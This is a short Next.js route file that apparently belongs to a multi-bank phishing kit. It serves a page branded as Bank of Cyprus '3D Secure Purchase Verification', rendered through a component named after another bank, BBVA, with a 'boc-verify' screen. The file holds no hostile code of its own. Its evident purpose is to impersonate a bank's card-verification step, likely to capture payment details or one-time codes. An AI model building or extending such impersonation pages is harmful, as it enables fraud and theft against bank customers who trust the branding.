import BbvaPage from "../page"

export const metadata = {
  title: "Bank of Cyprus — Πιστοποίηση Αγοράς",
  description: "3D Secure Purchase Verification",
}

export default function BocVerifyRoutePage() {
  return <BbvaPage initialScreen="boc-verify" />
}
